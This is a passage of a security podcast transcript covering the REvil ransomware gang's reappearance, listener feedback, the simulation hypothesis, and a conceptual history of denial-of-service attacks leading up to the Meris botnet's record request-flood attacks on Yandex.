So the three paragraphs or sentences that they got translated read:  "As Unknown (aka 8800)" - I don't know what that refers to.  "As Unknown disappeared, we the coders backed up and turned off all the servers.  Thought that he was arrested.  We tried to search, but to no avail.  We waited.  He did not show up, and we restored everything from backups.  After UNKN disappeared, the hoster informed us that the Clearnet servers" - Clearnet clearly being like the Internet the rest of us use, not Darknet, Clearnet is their term - "the Clearnet servers were compromised, and they deleted them at once.  We shut down the main server with the keys right afterward.  Kaseya decryptor, which was allegedly leaked by the law enforcement, in fact was leaked by one of our operators during the generation of the decryptor."  And that was signed "REvil."



So this suggests that Unknown is the guy in charge.  They're all keeping some arm's-length connections.  I mean, maybe Unknown is actually unknown even to them; right?  So it's like, you know, whatever they're doing, texting or using some secure comms or something in order to say, hey, where did you go?  Are you still around?  And they didn't know.  They thought maybe he'd been arrested.  Anyway, a dialogue apparently with this guy, Unknown, the REvil operator, that BleepingComputer was able to obtain reads this person saying:  "Nothing happened.  Took a break and now continue to work.  I advise you to take breaks too," smiley face.  Then the person who this conversation is with says:  "Yeah, a break is always good.  So are you an affiliate, or are you one of the REvil operators?"  And the reply is "Operator."



So if we believe all this, the REvil operation just decided to take a break.  I suspect that there's probably much more to it, but I'm pretty sure we're never going to know.  So it's worth noting, however, and the reason I mention this news, is that the distressingly successful ransomware gang behind the attacks on JBS and Coop and Travelex, GSMLaw, Kenneth Cole, Grupo Fleury and others, of course, and of course Kaseya famously, is back in operation.  Only time will tell what it means.  And to me I thought the real useful takeaway here was let's be sure to note when speculation is all we have.  You know, the whole security industry was like, whoa, REvil's gone.  Oh, Putin must have stomped him out and so on.



We have no idea what's going on.  We don't know, you know, we have no idea.  So it's like, okay, well, they're gone.  Good.  And then we were looking, as you reminded us, Leo, for evidence that maybe some of the people had renamed themselves.  And in fact maybe some did.  This looks like the Unknown guy went offline.  Some of his crew said, hey, where are you?  Maybe they did sort of say, well, shrugged, this guy, you know, Unknown's unknown, and now his whereabouts are unknown.  So let's go do something else.  Who knows?



Again, it's like the tip of the iceberg is all we're seeing.  We have no idea what the shape of the rest of it below the surface is.  But again, initially the reports were that when their leaking site and their blog log of attacks came up, there was nothing new, nothing since I think it was July 8th was the last one, and they went dark five days later on the 13th.  Now it looks like there is renewed activity.  There is some leakage, for example, of new victims in order to demonstrate, I guess they're flexing their muscles.  Yes, we really are back.  So anyway.



LEO:  Well, that's a great thing.  I'm so happy.



STEVE:  Yeah, isn't that sweet.  Isn't that precious.  Okay.  Two pieces of closing the loop.  One, my talk with you, Leo, about assembly language a couple weeks ago, I guess it was just last week, it generated a lot of interest among our listeners.



LEO:  Oh, good.  I knew it would.  People were interested, yeah.



STEVE:  I was surprised.  David Cortesi, he tweeted:  "'Zen of Assembly Language'" - that was the number one Michael Abrash text - "is hard to find on the used market, but it can be read free online at" - and there's a link in the show notes.  It's somebody's GitHub page.  And sure enough, the GitHub page says:  "This is the source for an eBook version of Michael Abrash's 'Zen of Assembly Language:  Volume I, Knowledge,' originally published in 1990 and reproduced with the blessing of Michael Abrash, converted and maintained by James Gregory."  And James Gregory is the site at GitHub.  It says:  "The GitHub releases have EPUB and Mobi versions available for download."



LEO:  They look really good, too.  A lot of times you'll find these, and they're scans from the page, and they don't look good.  This is - he did a good job of this.  It's very clean, yeah.



STEVE:  Yeah.  So he converted it to an HTML.  So there's an HTML as a single page you can scroll through.



LEO:  That's what I'm looking at, yeah.  Looks great.



STEVE:  Yup.  And there's also EPUB and Mobi versions.  And even, like, all of the listings from the examples that Michael cites through his text are also there.  And it's free.  You can click on the link, and you'll be looking at an HTML page.  If you don't want to spend much time on it, but you're even mildly curious, it's all there with Abrash's blessing.  So very cool.  Thank you for bringing that to my attention, David. 



LEO:  Yeah, yeah, really great.  Wow.  Makes me want to learn assembly language for about three seconds, yeah.



STEVE:  Yeah.  I have, oh my god, I have a Picture of the Week that I've been meaning to get to.  I will get to it.  It's one of those spoofed O'Reilly covers.



LEO:  Covers, yeah, yeah.



STEVE:  And it's "Web Dev in Assembly."  And it says something...



LEO:  Actually, believe it or not, there's something called WebAssem that is very popular right now, which is a low-level...



STEVE:  Well, because it's high-performance, yeah.



LEO:  Yeah, yeah, yeah.



STEVE:  Anyway, the subtitle for "Web Dev in Assembly" says something like you might as well just shoot yourself right now.



LEO:  Yeah.



STEVE:  I do all my web dev in assembly.  I understand that I'm weird.  Anyway, Mr. John Doe, as his Twitter handle goes, tweeted:  "@SGgrc my Verizon G3100 router recently updated and now has both a Guest network, and a separate IoT network.  I was astonished."  He said:  "I've heard you mention this type of network separation several times since I started listening to Security Now!.  Thanks."



And I was curious, so I did a little googling.  There is a Verizon FiOS G3100 Wireless 4-port switch GigE 802.11ax with MoCA 2.5 that looks - I'm just very impressed that a router would decide to update itself and add, like solicit the use of an IoT subnet for those devices.  That's just, I mean, that's very, very cool.



Okay, now, Leo.  This is where we get to whether you can eat doughnuts without any consequences or not.



LEO:  Okay.



STEVE:  I have this next piece under Science Fiction, but is it fiction?  The other day I googled "are we living in"  that's as far as I typed.  And I was frankly quite surprised when the suggested phrase completion offered was what I was planning to type anyway, which was "are we living in a computer simulation."  As much as we all know I'm a science fiction enthusiast, it turns out that this is actually a question.  Back in 2003, an Oxford University philosopher named Nick...



LEO:  Bostrom, yeah.



STEVE:  Yes, Bostrom, published in the Philosophical Quarterly his paper titled "Are You Living in a Computer Simulation?"  In that paper, Bostrom establishes a serious philosophical framework for considering the question.  And while Elon Musk made news when he brought up his support for what's become known as "the simulation hypothesis," the well-known astrophysicist Neil deGrasse Tyson had the same question posed to him by NBC News, with Tyson giving it a "better than 50-50 odds" that the simulation hypothesis is correct.  Tyson said:  "I wish I could summon a strong argument against it, but I can find none."



And by the end of his carefully constructed and considered paper, which I won't go into here, but I have a link to it in the show notes, Nick Bostrom concludes that, if computer-using aliens exist, meaning if there are intelligent entities having the power to create computer-based simulations, then, Bostrom argued, "we are almost certainly living in a computer simulation."



Now, I don't want to spend too much time, too much more time on this, but I want to note that the question is truly being taken very seriously.  On his podcast, StarTalk, when discussing this question, which was the topic of the entire podcast, Neil deGrasse Tyson observed that such a simulation would most likely create perceptions of reality on demand, rather than simulate all of reality all the time, in the same way that a videogame is optimized to render only the parts of a scene which are visible to the player.



Okay.  And two last points.  Last year in the "Space & Physics" section of Scientific American, a magazine that is serious - and Leo, you and I have a warm spot in our hearts for Scientific American.  This issue or this article, "Space & Physics" section dated October 13, 2020, the article posed the question "Do We Live in a Simulation?  Chances Are About 50-50."  Link in the show notes for anyone who's interested in delving further.



Wikipedia has a page titled "The Simulation Hypothesis."  And as I said, I have a link to Nick's paper in the show notes.  There's even, for someone who really wants to delve into this further, a website, simulation-argument.com, which hosts all of the repercussions, on both sides of the argument, of Nick's paper which have been catalyzed by his publication of the paper, what, 18 years ago.  If you think that the whole thing's just a big joke, you might want to spend a little time over at simulation-argument.com, where you will find some serious people giving this question some serious consideration.



Okay.  Now, what got me onto this whole thing?  It was the recently released trailer for the fourth movie in "The Matrix" series.  One of the Wachowskis, Lana, is bringing back Neo and Trinity for another special effects extravaganza which opens Wednesday, December 22nd, and I can't wait.  That'll be the day after our final podcast of 2021, and the trailer looks like it's going to be a lot of fun.  And who knows?  We all know how often science fiction predicts reality; right?  So perhaps this is actually recursive.  We're truly living in a Matrix-like pseudo-reality, and we're making movies about Matrix-like pseudo-realities.



LEO:  On we go with however you spell it or say it.  Meris.



STEVE:  However, yeah.  It's Latvian for "plague."



LEO:  I love that.



STEVE:  Meris.  Meris.  Meris.  Yeah, we haven't talked about DDoS attacks for a while.  But the recent series of headline-grabbing mega-attacks on the Russian multinational Yandex have recently been breaking all records to culminate in the largest single attack ever seen.  And since the attacks originated from a new and frighteningly large botnet, which is apparently hosted by unpatched and compromised routers, and these attacks could be aimed at any target on the Internet, I thought we ought to check in this week and catch up on what's going on in big botnet land.



So just Yandex is large enough to probably be at least somewhat familiar to this podcast's followers, though perhaps more so outside the U.S. than in.  It's one of the largest Internet companies in Europe, operating Russia's most popular web search engine, and Yandex is Russia's most-visited website.  Its revenue last year was around $3 billion USD.  And, you know, I could not resist converting that to rubles because you get about 1.4 cents per ruble.  So they had revenue of 214 billion rubles.  That's some serious rubles.



Anyway, it seems that apparently somebody has a grudge against Yandex, or perhaps they're just wanting to flex their new mega botnet's muscles to see what it can do.  And that's actually my theory because the attacks have just been little pulses.  When you think about it, I'm sure that someone running a huge botnet wants to know just how huge it is.  But it's not really possible to know how powerful a botnet is unless it's turned loose against someone.  And it's got to be somebody who just doesn't immediately collapse, but who is able, who's got defenses that are strong enough to be able to measure the incoming load on that network.  And since the typical result of a large and powerful botnet being unleashed is the, as I said, the immediate meltdown of its target, you've got to choose a sufficiently large - aim your net at somebody sufficiently large.



Anyway, before we dig into the details, let's review a bit about the history and the various forms of denial of service attacks and distributed denial of service attacks because they didn't start out being distributed, and they didn't even start out being high-bandwidth.  You didn't need much bandwidth.  First of all, let me just say that this term "denial of service" (DoS) is itself extremely broad and generic.  I'm always a little self-conscious when I use that in the other context because it's so strongly rooted in this notion of an Internet-based active attack of some kind, like something's really happening.



So when we've talked about newly discovered vulnerabilities which have not yet been weaponized into full attacks, the easier sort of junk attack is just to crash the service that receives some malformed packet.  It takes much more skill to finesse that into executing the attacker's code.  Way easier just to cause a crash.  And unfortunately, that's also referred to within the industry as a denial of service attack, technically, because a crashed service will be denying its clients its service.  So when we talk about it in the future, denial of service attacks, as being an exploit against something where one packet got sent, it's because it crashed something, not in the stronger original denial of service sense.



Okay.  So DoS and DDoS attacks have evolved tremendously through the years.  In every case we'll see that attacks can always be reduced to the consumption or overloading of some resource.  That is, you know, these kinds of denial of service attacks.  But before we get specific, we should briefly refresh our memory about the Open Systems Interconnection (OSI) model which describes and standardizes the roles of seven layers that computer systems use to communicate over a network.  The OSI's meaning of "layer" will become a little more clear when we talk about what the layers are doing.



The model was first - it was the first attempt at any standardization of network communications, and it was adopted by all major computer and telecommunications companies back in the early 1980s.  They were all hungry to adopt something, anything.  There were no standards, as I said.  And all we had back then was chaos.  So this was needed, and it really served to bring some order to what was chaos.  As it turned out, the Internet is only loosely based on the OSI model because it had no need for two of the upper layers.  They're 5 and 6, as we'll see.  But the others are all well identifiable in today's networking environment.



Layer 1 is known as the physical layer.  It literally describes and specifies the voltages and currents and bitrates and bit encoding that will be used to form the bits for every layer above.  So Layer 1 physical, the actual electrical layer, and the encoding of the bits.



Layer 2 is the data link layer.  For most networks today, that means Ethernet protocol.  That's where we have the 48-bit MAC addresses.  And so Layer 2 is the formatting of the bits that Layer 1 tells us how to create in the first place.  Layer 2 is the data link that says, okay, here's how we're going to move stuff, like the basic things around the network.



Layer 3 is the network layer.  This is where IP lives, the IP protocol.  And ARP, the so-called Address Resolution Protocol, is what's used to associate the IP addresses, IPv4 or IPv6, on Layer 3 to the MAC addresses, the 48-bit MAC addresses on Layer 2, so that you're able to route packets by IP, even though the routers route at the data link layer by MAC address.  So you needed to have some glue between those two, and that's what ARP does.



The next layer up is Layer 4, the so-called Transport Layer.  And this is where TCP, UDP, and ICMP and other transport layer protocols live.  And just as Layer 3 provides the payload that Layer 2 transports, similarly, Layer 4 is the payload for what Layer 3 transports.  In other words, TCP is transported by IP, which itself is transported by Ethernet.  They're like nested envelopes.  And so now we're at Layer 5 and 6, which don't exist in today's networking.  They're the Session and the Presentation layers, and they just aren't used here.



The final layer, at the top of this OSI stack of layers, is 7, known as the Application layer.  This is where protocols that run over TCP or UDP are found.  So of course that would be HTTP, FTP, SMTP, DNS, RDP, all of those things that we talk about.  They're being carried by TCP or UDP, which itself is at Layer 4, skipping 5 and 6.  And so these application layer protocols are running on Layer 7.  And we'll see that this ends up being a useful set of terminology.  Both we and the entity that I'll be talking about think in terms of OSI layers.



Okay.  So the very first attacks on Internet servers were, even though it's hard to imagine, low-bandwidth "SYN Trickle" attacks.  Those could be generated by a single client on the Internet, which was able to simply send TCP SYN packets to a remote server.  Just sending SYN packets, bloop bloop bloop bloop, not even very fast, would cause early TCP/IP protocol stacks in the Internet's web servers or whatever was answering TCP, so not necessarily web, FTP, SMTP, whatever, because in front of those protocol handlers - a web server, an FTP server, an email server - was the stack, the operating system level stack.  Sending just a series of SYN packets, not very fast, the stacks would take time and resources to get ready for connections to be made, which those TCP SYN packets were saying that remote client wanted to do.  So the stack would allocate memory and get itself all ready for a conversation.



Not very long after those conversations never happened, that pending connection resource would fill up and run out, and new connection requests had to get ignored.  Well, what that meant was that the real TCP SYNs from real users attempting to use the service couldn't get in.  The stack was full.  Can't accept any new connections.  So in this way, just this simple SYN trickle, a server offering any form of TCP connection-accepting service would become unable to accept legitimate connections once all of its local connection-accepting resources have been tied up just by a single client that never had any intention of honoring its TCP connection requests.  So the OSI model would place that attack at Layer 4 since it was specifically an attack against the server's implementation of its TCP protocol, and that's a transport layer.



Okay.  Now, if that was the SYN Trickle attack, the next thing that happened was the SYN Flood.  As we know, the Internet is essentially a data communications fabric, knit together by routers.  Packets come in, their IP addressing headers are examined, and they're routed toward their destination by referencing a routing table.  One of the parameters of routers is their maximum packet-handling rate.  Packets on the Internet can be of variable length.  But since packets have a fixed overhead for addressing, the maximum overall efficiency will be obtained using the longest packets which are practical since that will yield the greatest packet-to-header ratio.



Since it's unusual, therefore, for routers to encounter a high percentage of small packets, because those are very inefficient, the performance of a router's routing switch fabric will be scaled to handle the average packet rate that might be presented to it through all of its incoming interfaces.  And this explains the success of SYN flood attacks.  TCP SYN packets are among the tiniest packets possible.  Whereas a typical Internet packet will be 1514 bytes of payload, 1514 bytes, TCP SYN packets weigh in at just 60.  This means that 25 TCP SYN packets can fit into the physical space occupied by one normal-size IP space.



But physical space is the same as temporal space when you're talking about data flowing.  So it also means that if nothing but TCP SYN packets are sent to a router, they can arrive at a rate that's 25 times higher than typical Internet packets.  Since every one of those SYNs are valid IP packets, each one must be examined and routed to the proper interface.



But few routers are able to handle 25 times the routing rate demand that they were designed to handle.  Routers have short buffers which are used to even out the incoming flow.  They queue packets briefly, as needed.  But when a router's switch fabric is overloaded, those buffers will quickly overflow with the majority of packets being dropped and lost forever.  The original senders of legitimate packets will then retransmit the dropped packets, which just makes things worse.  And as a consequence, the packets of valid traffic will be very likely to be dropped.



So once again we have a denial of service.  Valid users, would-be users of the service that the router is in front of are unable to even reach the server.  And in this instance, the resource being consumed by the TCP SYN flood is the network's routing capacity near the targeted web server.  It's where traffic from across the Internet, in the case of a distributed denial of service attack, traffic is coming in from many different points across the Internet.  And with each step through a router, it generally becomes increasingly concentrated, and at some point it gets aggregated enough to begin collapsing the routers that are near to the target.



As a consequence, the targeted web server never even experiences most of the attacking traffic because it can't even reach the server, and of course neither can legitimate traffic.  So this type of SYN flood would be an attack that leverages the IP protocol, or a weakness in the routing of IP protocol, so that would be an attack at Layer 3.



TCP SYN flooding attacks are typically generated, as I've mentioned and we've talked about, by a fleet of bots widely spread across the Internet, each aiming at the same server and, over time, aggregating their traffic, thus a DDoS attack, a distributed denial of service attack.  Now, over time, because these attacks have been going on for decades, TCP/IP stacks were redesigned to tolerate the Layer 4 SYN trickle attacks.  It turns out it's possible to start a TCP connection statelessly, meaning without storing any local state.  So it's possible to honor the TCP/IP protocol and not commit any resources from the receipt of a TCP SYN packet, still be able to emit a SYN/ACK, and then wait for the final, the third packet and a handshake, that ACK.



And actually it's by taking that ACK and the things it contains that you're able to quickly scurry around.  You know it can't be a spoofed source IP because the sender had to, or the originator of the SYN had to receive the SYN/ACK and send back an ACK to you for the SYN/ACK that was sent.  So anyway, it solves the problem in a clever way.  And Internet routers were also upgraded so that they would be able to handle the high rates of small packets at Layer 3 without collapsing.  Okay.  Again, cat and mouse.  More brute force methods needed to be devised.



Someone noticed that a very small query to a DNS server could result in a very large reply.  Since DNS servers reply to the IP that queried, the Unix raw socket API was used once again to spoof the source IP of the query.  And thus were born the so-called reflection/amplification attacks.  Even one determined attacker with a high-speed connection might bring down a large website.  The attacker would send tiny DNS queries as fast as their connection would allow.  And because the queries were small, that meant they could get a lot of them out per second.  Those would be sprayed all across the Internet's publicly available DNS servers.



So the DNS servers weren't being deluged because there are many of them, and it's easy for an attacker to spray their tiny little queries at high rate across many DNS servers, so the rate per server is kept low.  In every case, that attacker would spoof their source IP to being that of the target server, which would cause all of those DNS servers who thought they were receiving a legitimate DNS query to send their much larger reply packets to that single spoofed IP.  In this case it wasn't a router's switching engine fabric which would be overwhelmed.  It was the total bandwidth of the site's connection to the Internet.



Most web surfing traffic is very bursty.  We look at a page for a while before we click another link on the site.  And many times the site doesn't have what we're looking for, so we'll just hit our browser's back button to step back to wherever it was we came from.  And even when we do load a page, these days a huge percentage of a website's total page content is being delivered by other Internet web servers.  Right?  All these other content providers that are causing us so much grief most of the time. 



The result of this natural burstiness and this source distribution of web traffic is that sites are not scaled to handle massive amounts of continuous traffic because that never happens unless the site is being subjected to a significant bandwidth attack.  All that's needed is to overwhelm a website's scaling for normal daily traffic.  And it turns out that's not too difficult to do.  When aided by raw socket IP address spoofing, and servers like DNS that can be induced to amplify Internet traffic, it's often feasible to readily overwhelm a site's connection bandwidth.  But over time this, too, was overcome by aggregating many sites to share much larger Internet connection bandwidth.  100 websites might share 100 times the bandwidth.



Individually, the economics still make sense, and they're still getting the same amount of bandwidth.  But by pooling their individual bandwidths to create a much larger shared bandwidth aggregate pool, they're now able to transiently borrow from that pool as needed to thwart large bandwidth attacks while still remaining on the air.  Cloudflare and other large providers have been quite successful in offering anti-DDoS protection by fronting for their website clients.



But today's modern websites are dynamic.  They do not deliver static HTML pages which sit as text files on nonvolatile disk storage.  When you see a site whose page URLs end in .php or .asp or .jsp, you're seeing a page which doesn't actually exist anywhere as an HTML web page.  Instead, it was created by invoking a script.  Many sites like those created by WordPress, any modern shopping or catalog site - eBay, for example, or Craig's List - or any web forum, only exist as collections of virtual pages which are created on the fly, on demand, from a collection of SQL database queries admitted by PHP, Active Server Pages, or Java Server Pages.  And then the results of those queries are knit together to produce finished HTML.



So it turns out that running that scripting, serving those SQL database queries, and assembling those finished pages can be quite compute intensive.  It's neat and flexible to be assembling pages on the fly from templated style sheets, but this approach inherently introduces a new bottleneck which can be attacked and which may prove significantly more difficult to filter and block.  Whereas yesterday's attacks, being measured in packets per second or bits per second, were "transport layer" capacity attacks of one form or another, and of course those are referred to as Layer 3 or 4 attacks, the newest form of attack is an application layer capacity attack where the attack strength is measured in requests made per second (RPS).  Similarly, these are often referred to as the OSI Layer 7 (application layer) attacks.



And this brings us to the topic of today's podcast, this Meris Botnet.  We started this discussion by talking about Yandex.  Like many large firms, they have their own internal network security people, while also employing the talents of external security firms who have an inherently broader scope and are able to provide more experience and specialization as well as network services to their clients.  Yandex's exterior partner is Qrator Labs, spelled Q-R-A-T-O-R, Qrator Labs.



Qrator Labs is a big European Internet security and attack mitigation company.  They maintain offices in Prague, which of course is in the Czech Republic; Dubai in the UAE; and in Moscow.  Their page on DDoS attack prevention, which is a service they offer, they explain:  "Automatic DDoS mitigation at all OSI levels up to L7 (application level) inclusive, on all the tariff plans, with no exception.



"All layers of protection solutions by Qrator Labs solution work together in a connected complex.  This approach serves as base for neutralization of even the most complex attacks, which sometimes combines DDoS attacks on channel capacity with the attacks on the layer of web applications (L7), frequently accompanied by hacking.



"The system blocks not only high-speed network layer attacks (L3 and L4), but also low-frequency destructive L7 attacks which can only be identified through behavioral or correlational analysis and continuous traffic monitoring.  The speed of reaction to DDoS attacks is reduced to the absolute minimum as the system works in fully automatic mode, which also ensures the uptime of clients' web resources 24/7."



Okay.  So that's how they're describing themselves and one aspect of many services that they offer.  Last Thursday, Qrator published a blog posting that surprised and worried many in the Internet community and generated many headlines.  Its title was "Meris botnet, climbing to the record."  And they wrote:  "For the past five years, there have virtually been almost no global-scale application-layer attacks.  During this period, the industry has learned how to cope with the high-bandwidth network layer attacks, including amplification-based ones.  It does not mean that botnets are now harmless.



"End of June 2021, Qrator Labs started to see signs of a new assaulting force on the Internet, a botnet of a new kind.  That is a joint research we conducted together with Yandex to elaborate on the specifics of the DDoS attacks enabler emerging in almost real-time.  We see here a pretty substantial attack force, dozens of thousands of host devices, growing.  Separately, Qrator Labs saw the 30,000 host devices in actual numbers through several attacks, and Yandex collected the data of about 56,000 attacking hosts."



Now, I need to pause here for a moment to mention something that I forgot to.  And that is the issue of identifying the attacking devices.  In DNS, for example, reflection attacks against DNS servers themselves which appear to be swamping the target with unasked-for and unwanted DNS queries, the queries appear to be coming from the target.  The fact is, they're being spoofed by one or more attackers generating, sending those queries out to DNS servers.  So there's no way to identify by the payload in the packets, the IP addresses, who is actually behind this, what their actual IP is.  And anytime IP addresses are being spoofed, that's the case.  We just don't know how to identify them.  But this is never the case whenever an full TCP connection is completed.



And I was just talking about that with respect to the stateless TCP connection initiation protocol.  Any time you have a Level 7 attack, it is over TCP.  The IP of the request that's coming in is somebody who's making that request.  You could have proxies in the way.  That's possible.  But you still have an IP address that you know of that, for example, you could block if you had to.  So in order for a malicious client to attack a website by issuing a web query, the site must receive as part of that query a valid IP for the other endpoint of the conversation.  Layer 7 attacks cannot be blind.



Okay.  So when they say, "We see here a pretty substantial attacking force, dozens of thousands of host devices growing separately," blah blah blah, 30,000 in one case, Yandex saw 56,000, they actually have enumerated those devices' IP addresses.  So then they continue:  "However, we suppose the number to be higher."  And we get to that gruesome reality in a minute.  They said:  "Probably more than 200,000 devices, due to the rotation and absence of will to show the full force attacking at once.  Moreover, all those being highly capable devices, not your typical IoT blinker," as they put it, "connected to WiFi, here we speak of a botnet consisting of, with the highest probability, devices connected through the Ethernet connection," meaning hard-wired network devices primarily.



They wrote:  "Some people and organizations already call the botnet 'a return of Mirai,' which we do not think to be accurate.  Mirai possessed a higher number of compromised devices united under command-and-control, and it attacked mainly with volumetric traffic."  Meaning Mirai was a flooding botnet. 



They said:  "We've not seen the malicious code, and we are not ready to tell yet if it is somehow related to the Mirai family or not."  And actually they said somewhere - oh, in fact it's here.  I'll get to it in a second.  "We tend to think that it is not, since the devices it unites under one umbrella seem to be related to only one manufacturer, MikroTik."  They said:  "Another reason we wanted to name this particular botnet, operating under elusive command-and-control" - which was interesting - "with a different name, Meris, which means 'plague' in Latvian.  It seems appropriate and relatively close to Mirai in terms of pronunciation."  So, okay, both of them begin with "M" and have five letters.



Okay.  Specific features of the Meris botnet:  SOCKS4 proxy at the affected device maybe.  That's unconfirmed, although MikroTik devices do use SOCKS4.  The use of, and this is going to turn out to be very significant, HTTP pipelining, which is to say HTTP/1.1, and we know HTTP/2 does it also, which is a technique for further amplifying DDoS attacks.  That's confirmed.  Making the DDoS attacks themselves RPS, that is to say requests per second, based.  That's confirmed.  And open port 5678 is confirmed.



They said:  "We do not know precisely what particular vulnerabilities lead to the situation where MikroTik devices are being compromised on such a large scale.  Several records at the MikroTik forum indicate that its customers experienced hacking attempts on older versions of RouterOS, particularly 6.40.1 from 2017.  If this is correct, and we see that old vulnerability still being active on thousands, actually hundreds of thousands of devices being unpatched and unupgraded, this is horrible news.  However, our data with Yandex indicates that this is not true because the spectrum of RouterOS versions we see across this botnet varies from years old to recent.  The largest share belongs to the version of firmware previous to the current stable one."  In other words, not four years ago, but very recent.



And I didn't put - they had a big pie chart showing all of the RouterOS versions.  Clearly, Yandex has a strong interest because they're receiving this attack traffic; they're receiving the attacking IP.  They can probe that IP.  And it turns out that RouterOS answers with its version number.  So they've got a complete histogram breakdown of the RouterOS versions that are attacking them, and it looked like all of them to me.  I mean, it's like, not a few.



They wrote:  "There's a suggestion that the botnet could grow in force through password brute-forcing, although we tend to neglect that as a slight possibility.  That looks like some vulnerability that was either kept secret before the massive campaign's start or sold on the black market."  In other words, there's a vulnerability nobody has known about.  These guys bought it or discovered it, and they leveraged it to grow themselves a botnet of serious size and capability.



They said:  "It is not our job to investigate the origins, so we must move on with our observations.  In the last couple of weeks, we have seen devastating attacks toward New Zealand, the United States, and Russia, which we all attribute to this botnet species.  Now it can overwhelm almost any infrastructure, including some highly robust networks.  All this is due to the enormous requests per second power that it brings.



"It's been in the news lately about 'largest DDoS attack on Russian Internet and Yandex,' but we at Yandex saw a picture much bigger than that.  Cloudflare recorded the first attacks of this type.  Their blog post of August 19, 2021 mentioned the attack reaching 17 million requests per second.  We observed similar durations and distributions across countries and reported this information to Cloudflare."



I have a graph in the show notes showing the single largest attack ever recorded, which occurred on September 5th, 2021, so that was Sunday before last.  They show a prior history on 8/9 of this year, 5.2 million requests per second.  I'm sorry, on 8/7.  Two days later, on 8/9, the 5.2 had grown to 6.5 mrps.  Twenty days later, on 8/29, that was up to 9.6 mrps.  Two days after that, on 8/31, 10.9 mrps.  And that September 5 attack, Sunday before last, was the largest ever seen at 21.8 mrps.  Okay.  So 21.8 million HTTP valid GET or POST requests, each of which is going to attempt to invoke a script which will be interpreted on a web server, causing it to generate multiple SQL database queries in order to dynamically build a web page which the request has asked for.



I mean, it's just not possible.  It's not feasible to imagine a backend that is able to handle that because nothing in nature generates 21.8 mrps, or even close to it.  My little bandwidth at Level 3, I have a 100Mb connection, you know, 10Base-T, or 100Base-T.  You know, and it just purrs along at a few megabits, typically, and every so often somebody downloads something, and there's a little spike in the bandwidth.  That's what Internet traffic typically looks like.  Nothing like this.  I mean, not that I have a huge site.  I'm sure Yandex's site, the most busy page in Russia, is way busier.  But nothing like this.  



LEO:  And this is a zero-based graph, which I like.



STEVE:  Yes, yes.



LEO:  Starts at zero, goes to...



STEVE:  And actually, thank you, Leo, I'm glad you mentioned it.  Zero-based, and notice what the line looks like normally.  You can see what their request per second was before this happened.  We don't have enough resolution in the scale to estimate.  But it's like nothing.



LEO:  Nothing.



STEVE:  Compared to this 21.8.



LEO:  Wow.



STEVE:  So Yandex's security team members managed to establish a clear view of the botnet's internal structure.  You can imagine, they're desperately going to be poking and probing the things that are attacking them, trying to figure out.  There are...



LEO:  They mitigated it pretty quickly.  I mean, it looks like it only lasted a few minutes.



STEVE:  Oh, no, no.  That wasn't mitigation.  That was a probe.



LEO:  Oh.  That was just a single thrust.



STEVE:  Yes.  It was not mitigated.  It was, yes, that was a single thrust.



LEO:  Oh, okay.



STEVE:  That was so that...



LEO:  That was just a couple of minutes on that one.



STEVE:  The attackers did that so this posting would result that would tell them how good their botnet was.



LEO:  Oh, great.  It's good, gang.  Well done.



STEVE:  Yeah, stop.  Good enough.  Stop.  You don't need any more.  Okay.  So the attacking source's IP addresses, which were not spoofed, seem to be predominantly the same trait.  They have open ports 2000 and 5678.  And they wrote that of course many vendors put their services onto those particular ports.  However, the specific combination of port 2000, which was "Bandwidth Test Server," and port 5678, which is the "MikroTik" - and I remember I used to pronounce or mispronounce it my-crot-ic, Leo.  Now I'm...



LEO:  Which is probably right.



STEVE:  Correct pronunciation, yes.  The "MikroTik Neighbor Discovery Protocol," they said, "makes it almost impossible to ignore."



LEO:  Oh, great.



STEVE:  "Although MikroTik uses UDP for its standard service on port 5678, an open TCP port is detected on compromised devices.  This kind of disguise might be one of the reasons devices got hacked unnoticed by their owners.  So based on this intel," they said, "we decided to probe the TCP port 5678 with the help of Qrator.Radar.  The results we have gathered were surprising and frightening at the same time."  It turns out that there are 328,723 active hosts on the Internet replying to the TCP probe on port 5678.  They said of course not necessarily each of those is a vulnerable MikroTik router.  There is evidence that Linksys devices also use TCP service on port 5678.  There may be more.



But at the same time, we have to assume that this number might represent the entire active botnet.  42.6% of those IPs are located in the United States.  Just shy of 140,000 of those are MikroTik routers here.  China is second, with just shy, like six shy of 62,000 of those at 18.9%.  Then we have Brazil at 9,000, Indonesia at 7, India at 6, Hong Kong at 5.  And then Japan, Sweden, and South Africa all with just shy of 5,000, and about 1.5%.  So, okay.  The pipelining that they got, that they mentioned before, right, they talked about HTTP/1.1 using pipelining.  We've talked about this.  This is a big concern.  This indicates that these evil bots were well-designed for this application.



We've talked about the advances in HTTP that allow for multiple outstanding requests to be pipelined, meaning that multiple queries can be sent to the server for it to handle an answer as it sees fit, even if they're out of order.  For example, there might be one query that is going to take it awhile, yeah, like any of these things using active content, whereas you might be also asking for a GIF, which is tiny, like the favicon, in which case you might ask for that third, but the server gets them all, and it sees one it can deal with quickly.  So while the active content engine is busy trying to build a page, it sends the favicon back out to you.  That's the beauty of pipelining HTTP.



But by using pipeline requests, we have something that's vaguely reminiscent of the earlier Level 3 and Level 4 flooding attacks, but far more devastating and difficult to block.  The only upside is that the attacking IP addresses cannot be spoofed, so they could theoretically be blocked.  But blocking a list of 328,723 remote IPs alone comes with its own challenges.  How exactly does one do that?  That's a lot of discrete IP addresses.  And they're not all lumped together in one network where you can block them off by network.  They're just everywhere.



LEO:  That's why it works so well.



STEVE:  Exactly.  And these are also HTTPS requests.



LEO:  Oh, wow.



STEVE:  Meaning that no external agency is able to see into the queries until the targeted website provides their TLS certificate so that the filtering agency can accept and terminate them.



LEO:  So Cloudflare, for instance, couldn't mitigate.  What is the drop in the spike?  Burke wants to know why there are two points on the spike.



STEVE:  You sort of see that from time to time in attacks.



LEO:  They rev it up, and then it pauses, and then it goes.



STEVE:  Yeah.  Or something crashed and then managed to get itself back online.  I mean, these things are really being brutal to all the equipment that is involved.



LEO:  It's amazing, yeah.  



STEVE:  The other clever thing that HTTP pipelining brings is a reduced need for TLS connection setup.  If multiple requests are sent down a single TLS connection, less time is spent establishing a connection.  And the other confounding thing is these are not invalid requests.  You can't, like, deny them or block them because they're bad.  They're valid.  So they look just like the requests that the site is trying to simultaneously  honor from non-attacking IP addresses.  I mean, it is really a mess.



LEO:  Wow. 



STEVE:  Yeah.  So what we've watched over the years is a gradual evolution in attack technology.  In those quaint old days, source IPs were being spoofed to hide the attacker's identity when trickling TCP SYN packets into a server to successfully bring it down.  Then later, source IPs were being spoofed to bounce reflection and amplification attacks off of other machines on the Internet, causing them to indirectly attack the target with a pure bandwidth flood.



